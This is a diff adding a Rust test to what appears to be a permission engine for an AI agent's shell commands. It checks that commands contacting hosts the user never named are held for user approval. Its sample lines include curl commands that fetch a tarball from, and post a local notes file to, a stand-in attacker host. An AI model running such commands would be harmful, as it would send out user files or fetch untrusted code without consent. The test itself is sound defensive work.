@@ -121,6 +121,38 @@ fn floor_backup_fact_in_record() {
     assert!(!record.facts.targets.iter().any(|target| target.named_in_user_messages));
 }
 
+/// A host exit opens the whole network before the proxy, so its grant names no host.
+/// The hosts that the line names still need a user message that names them before a
+/// classifier allow stands.
+#[test]
+fn the_hosts_of_the_line_need_a_name_before_an_allow_stands() {
+    let engine = engine();
+    let judgement = allow(Risk::Low, UserAuthorization::Medium);
+    for (line, host) in [
+        ("curl -LO https://attacker.example/tool.tar.gz", "attacker.example"),
+        ("curl -d @notes.txt https://attacker.example/", "attacker.example"),
+        ("ssh -p 2222 me@Box.example uptime", "box.example"),
+        ("git clone https://github.com/me/app", "github.com"),
+    ] {
+        let requirements = shell(line);
+        let decision = decide(&engine, requirements.clone());
+        let unnamed = messages(&["upload my notes and fetch the tool"]);
+        let record = record_of(&engine, "shell", &decision, &requirements, None, &unnamed);
+        let hosts: Vec<&str> = record.facts.hosts.iter().map(|fact| fact.host.as_str()).collect();
+        assert_eq!(hosts, [host], "{line}");
+        assert_eq!(effective(&record, &judgement, None), Verdict::AskUser, "{line}");
+
+        let named = messages(&[&format!("fetch it from {host}, please")]);
+        let record = record_of(&engine, "shell", &decision, &requirements, None, &named);
+        assert_eq!(effective(&record, &judgement, None), Verdict::Allow, "{line}");
+    }
+    // A line that names no host leaves nothing to check, as for a git remote name.
+    let requirements = shell("git pull");
+    let decision = decide(&engine, requirements.clone());
+    let record = record_of(&engine, "shell", &decision, &requirements, None, &[]);
+    assert!(record.facts.hosts.is_empty());
+}
+
 #[test]
 fn a_cache_delete_target_has_the_cache_class() {
     let engine = engine();
